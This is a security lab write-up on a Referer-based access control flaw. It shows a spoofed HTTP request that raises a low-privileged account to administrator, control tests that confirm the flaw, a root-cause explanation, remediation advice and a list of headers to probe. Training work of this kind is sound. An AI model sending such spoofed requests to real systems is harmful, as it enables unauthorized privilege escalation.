# Referer-Based Access Control

## Overview

This lab demonstrates a **referer-based access control vulnerability**.

The application attempted to protect an administrative role-management function by checking the `Referer` HTTP header.

Because the `Referer` header is supplied by the client and can be modified, a low-privileged user was able to spoof an administrative origin and execute a privileged action.

---

## Vulnerability

The administrative role-management functionality used the following request:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: <lab-host>
Cookie: session=<admin-session>
Referer: https://<lab-host>/admin
```

The important header was:

```http
Referer: https://<lab-host>/admin
```

The application appeared to trust this value when deciding whether the request originated from an authorized administrative page.

---

## Initial Observation

The role-changing request was sent from the `/admin` page, so the browser automatically included:

```http
Referer: https://<lab-host>/admin
```

This raised the following question:

> Does the application verify the user's actual privileges, or does it simply trust the `Referer` header?

Because HTTP headers can be modified in tools such as Burp Repeater, the value could be tested independently from the authenticated session.

---

## Exploitation

The administrator session was replaced with the session belonging to the low-privileged `wiener` account.

The target username was also changed:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-host>
Cookie: session=<wiener-session>
Referer: https://<lab-host>/admin
```

The request succeeded and the `wiener` account was promoted to administrator.

This demonstrated that possession of an administrative session was not required.

Instead, the application trusted the attacker-controlled `Referer` header.

---

## Control Testing

To verify that the vulnerability was specifically related to the `Referer` header, additional requests were tested.

### Missing Referer

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-host>
Cookie: session=<wiener-session>
```

Response:

```http
HTTP/2 401 Unauthorized
```

### Incorrect Referer

A request with a non-administrative `Referer` was also rejected:

```http
Referer: https://<lab-host>/
```

Response:

```http
HTTP/2 401 Unauthorized
```

### Spoofed Administrative Referer

Using:

```http
Referer: https://<lab-host>/admin
```

caused the same low-privileged request to succeed.

The observed behavior was therefore:

```text
Low-privileged session + no Referer
→ 401 Unauthorized

Low-privileged session + incorrect Referer
→ 401 Unauthorized

Low-privileged session + Referer ending in /admin
→ role upgrade succeeds
```

This confirmed that the authorization decision depended on the client-controlled header.

---

## Why the Attack Worked

The vulnerable application effectively relied on logic similar to:

```text
Does Referer point to /admin?
        |
     +--+--+
     |     |
    Yes    No
     |     |
     v     v
   Allow  Deny
```

This is not a valid authorization mechanism.

The application should instead verify the authenticated user's privileges:

```text
Is the current user an administrator?
        |
     +--+--+
     |     |
    Yes    No
     |     |
     v     v
   Allow  Deny
```

The `Referer` header only describes where the client claims the request originated from.

It does not prove that the user is authorized to perform the requested action.

---

## Root Cause

The root cause was **trusting client-controlled request metadata for authorization**.

The application used:

```http
Referer: https://<lab-host>/admin
```

as evidence that the request was legitimate.

However, the attacker could manually construct the same header while using a low-privileged session.

The vulnerability can be summarized as:

```text
Sensitive administrative action
        +
Authorization based on Referer
        +
Attacker-controlled HTTP headers
        =
Access control bypass
```

---

## Impact

A low-privileged authenticated attacker could execute administrative functionality by spoofing the expected `Referer` value.

Potential consequences include:

* vertical privilege escalation;
* unauthorized account modification;
* administrative actions;
* modification or deletion of sensitive data;
* compromise of authorization boundaries.

In this case, the attacker was able to promote their own account to administrator.

---

## Remediation

Authorization must be based on trusted server-side identity and permission information.

Recommended controls include:

* Verify the authenticated user's role before every sensitive operation.
* Never use the `Referer` header as an authorization mechanism.
* Treat all client-controlled HTTP headers as untrusted input.
* Enforce authorization inside the business logic responsible for the privileged action.
* Return an authorization error when the authenticated user lacks the required permissions, regardless of request origin.

A secure implementation should conceptually behave like:

```text
Request to /admin-roles
        |
        v
Authenticate user
        |
        v
Check user role
        |
     +--+--+
     |     |
   Admin  Non-admin
     |     |
     v     v
  Execute 403 Forbidden
  action
```

---

## Referer vs Authorization

The `Referer` header may be useful for analytics, logging, navigation context, or limited security heuristics.

It must not be treated as proof of identity or authorization.

For example:

```http
Referer: https://example.com/admin
```

does not prove that:

```text
- the user visited the admin page;
- the user is an administrator;
- the request originated from a trusted workflow;
- the requester is authorized to execute the action.
```

All of these properties must be verified independently on the server side.

---

## Key Takeaway

When testing privileged functionality, inspect whether access control decisions depend on client-controlled headers.

Headers worth examining include:

```text
Referer
Origin
X-Forwarded-For
X-Original-URL
X-Rewrite-URL
```

The key question is:

> Is the application using attacker-controlled request metadata as evidence of authorization?

If changing a header allows a low-privileged user to perform a privileged action, the application may be vulnerable to an access control bypass.
